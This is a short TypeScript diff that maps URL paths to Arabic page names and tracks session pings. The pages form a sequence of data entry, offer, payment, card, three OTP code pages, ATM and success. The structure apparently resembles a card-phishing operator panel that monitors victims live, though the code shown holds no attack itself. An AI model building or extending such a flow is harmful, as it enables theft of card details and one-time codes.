@@ -9,19 +9,24 @@ const PING_INTERVAL_MS = 5000; // 5 seconds
 // Page names mapping for better readability
 export const PAGE_NAMES: Record<string, string> = {
   "/": "الرئيسية",
+  "/form": "تسجيل البيانات",
+  "/select": "اختيار العرض",
+  "/total": "الدفع",
+  "/total2": "الدفع 2",
   "/card": "إدخال البطاقة",
+  "/visa": "البطاقة",
   "/otp": "الرمز",
   "/otp2": "الرمز 2",
+  "/otp3": "الرمز 3",
   "/atm": "الصراف",
   "/success": "نجاح",
-  "/": "تسجيل البيانات",
 };
 
 export function getPageName(path: string): string {
   return PAGE_NAMES[path] || path;
 }
 
-interface PingData {
+export interface PingData {
   session_id: string;
   current_page: string;
   last_ping: string;
